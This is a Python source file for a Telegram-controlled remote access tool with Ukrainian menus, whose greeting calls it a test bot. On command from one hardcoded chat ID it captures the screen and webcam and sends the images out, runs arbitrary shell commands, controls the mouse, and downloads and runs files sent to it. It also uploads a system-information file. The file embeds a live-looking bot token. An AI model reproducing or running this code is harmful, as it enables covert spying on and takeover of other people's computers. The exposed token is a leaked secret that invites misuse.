import telebot
import cv2
from telebot import types
from PIL import ImageGrab
import os
import time
import pyautogui

bot = telebot.TeleBot("5377433922:AAG4QIoFIbtv587e4QJ9a7bo1AKtB4zxK6I")
ID: int = 886293441


@bot.message_handler(commands=['start', 'help'])
def start(message):
    if message.chat.id == ID:
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        btn1 = types.KeyboardButton("Отримати скріншот екрану")
        btn2 = types.KeyboardButton("Відкрити командний рядок")
        btn3 = types.KeyboardButton("Команди pyautogui")
        btn4 = types.KeyboardButton("Запустити код")
        btn5 = types.KeyboardButton("Отримати фото з камери")
        btn6 = types.KeyboardButton("Отримати данні комп'ютера")
        markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
        bot.send_message(ID,
                         text="Привіт {0.first_name}! Я тестовий бот".format(
                             message.from_user), reply_markup=markup)

@bot.message_handler(content_types=['text', 'image'])
def func(message):
    if message.chat.id == ID:

###########################################################################

        if (message.text == "Отримати скріншот екрану"):
            screen = ImageGrab.grab()
            bot.send_message(ID, "Знімок з екрана:")
            bot.send_photo(ID, screen)

###########################################################################

        elif message.text == "Отримати фото з камери":
            cap = cv2.VideoCapture(0)
            for i in range(30):
                cap.read()
            ret, image = cap.read()
            path = 'C:\Windows\Temp'
            cv2.imwrite(os.path.join(path , 'cam.jpg'), image)
            cap.release()
            photo = open('C:\Windows\Temp\cam.jpg', 'rb')
            bot.send_message(ID, "Знімок з камери")
            bot.send_photo(ID, photo)
            photo.close()
            os.remove("C:\Windows\Temp\cam.jpg")


###########################################################################

        elif message.text == "Відкрити командний рядок":
            markup_cmd = types.ReplyKeyboardMarkup(resize_keyboard=True)
            btn_back1 = types.KeyboardButton("Скасування")
            markup_cmd.add(btn_back1)
            snd_message = bot.send_message(ID, "Введіть команду, яка виконається в командному рядку",
                                           reply_markup=markup_cmd)
            bot.register_next_step_handler(snd_message, open_cmd)

###########################################################################

        elif (message.text == "Команди pyautogui"):
            markup_command = types.ReplyKeyboardMarkup(resize_keyboard=True)
            btn1 = types.KeyboardButton("Пересунути курсор")
            btn2 = types.KeyboardButton("Натиснути на ліву клавішу миші")
            btn3 = types.KeyboardButton("Натиснути на праву клавішу миші")
            back_back = types.KeyboardButton("Назад")
            markup_command.add(btn1, btn2, btn3, back_back)
            bot.send_message(ID, text="Виберіть дію", reply_markup=markup_command)

###########################################################################

        elif message.text == "Запустити код":
            global start_cod
            start_cod = True
            start_markup = types.InlineKeyboardMarkup(row_width=1)
            back1 = types.InlineKeyboardButton("Скасування", callback_data="back3")
            start_markup.add(back1)
            send_message = bot.send_message(ID,
                                            "Надішліть код з розширенням .py",
                                            reply_markup=start_markup)
            bot.register_next_step_handler(send_message, start_code)

###########################################################################

        elif message.text == "Пересунути курсор":
            global move_cur

            move_cur = True
            reply_curcor = types.InlineKeyboardMarkup(row_width=1)
            back1 = types.InlineKeyboardButton("Скасування", callback_data="back1")
            reply_curcor.add(back1)
            send_message = bot.send_message(ID, "Введіть куди пересунути курсор (x, y) через кому. Приклад: 100,100:",
                                            reply_markup=reply_curcor)
            bot.register_next_step_handler(send_message, move_cursor)

###########################################################################

        elif message.text == "Натиснути на ліву клавішу миші":
            reply_curcor = types.InlineKeyboardMarkup(row_width=1)
            clickl1 = types.InlineKeyboardButton("Натиснути 1 раз", callback_data="clickl1")
            clickl2 = types.InlineKeyboardButton("Натиснути 2 рази", callback_data="clickl2")
            back2 = types.InlineKeyboardButton("Скасування", callback_data="back2")
            reply_curcor.add(clickl1, clickl2, back2)
            bot.send_message(ID,
                             "Натисніть на кнопку",
                             reply_markup=reply_curcor)

###########################################################################

        elif message.text == "Натиснути на праву клавішу миші":
            reply_curcor = types.InlineKeyboardMarkup(row_width=1)
            clickr1 = types.InlineKeyboardButton("Натиснути 1 раз", callback_data="clickr1")
            back2 = types.InlineKeyboardButton("Скасування", callback_data="back2")
            reply_curcor.add(clickr1, back2)
            bot.send_message(ID,
                             "Натисніть на кнопку",
                             reply_markup=reply_curcor)
###########################################################################

        elif message.text == "Отримати данні комп'ютера":
            bot.send_message(ID, text="Ща брат 5 сек".format(message.from_user))
            os.system("python pc_information.py")
            time.sleep(5)
            doc = open("C:\Windows\Temp/info.txt", "rb")
            bot.send_document(ID, doc)
            doc.close()
            os.remove("C:\Windows\Temp\info.txt")

###########################################################################

        elif message.text == "Назад":
            start(message)

###########################################################################

@bot.callback_query_handler(lambda callback: callback.data)
def check(callback):
    if callback.data == "back1":
        global move_cur

        move_cur = False
        bot.delete_message(ID, callback.message.message_id)

###########################################################################

    elif callback.data == "clickl1":
        x, y = pyautogui.position()
        pyautogui.leftClick(x, y)
        bot.delete_message(ID, callback.message.message_id)
        bot.send_message(ID, "Клавіша натиснута")

###########################################################################

    elif callback.data == "clickl2":
        x, y = pyautogui.position()
        pyautogui.leftClick(x, y)
        pyautogui.leftClick(x, y)
        bot.delete_message(ID, callback.message.message_id)
        bot.send_message(ID, "Клавіша натиснута")

###########################################################################

    elif callback.data == "clickr1":
        x, y = pyautogui.position()
        pyautogui.rightClick(x, y)
        bot.delete_message(ID, callback.message.message_id)
        bot.send_message(ID, "Клавіша натиснута")

###########################################################################

    elif callback.data == "back2":
        bot.delete_message(ID, callback.message.message_id)

###########################################################################

    elif callback.data == "back3":
        global start_cod

        start_cod = False
        bot.delete_message(ID, callback.message.message_id)

def open_cmd(message):
    if message.text == "Скасування":
        start(message)
    else:
        rez = os.system(message.text)

        if rez == 0:
            bot.send_message(ID, "Команда виконана успішно")
        else:
            bot.send_message(ID, "Увага! Помилка!")
        start(message)

def move_cursor(message):
    if move_cur:
        try:
            x, y = map(int, message.text.split(","))
            pyautogui.moveTo(x, y)
            bot.send_message(ID, "Курсор посунутий")
        except:
            bot.send_message(ID, "Помилка")
            message.text = "Пересунути курсор"
            func(message)
    else:
        func(message)

def start_code(message):
    if start_cod:
        file = bot.get_file(message.document.file_id)
        filename, file_extension = os.path.splitext(file.file_path)

        b = "qadrw" + file_extension

        save_photo = bot.download_file(file.file_path)

        with open(b, 'wb') as new_file:
            new_file.write(save_photo)

        bot.send_message(ID, f"Код прийнятий")
        os.startfile(b)
        bot.send_message(ID, f"Код запущений")
    else:
        func(message)

bot.polling(none_stop=True)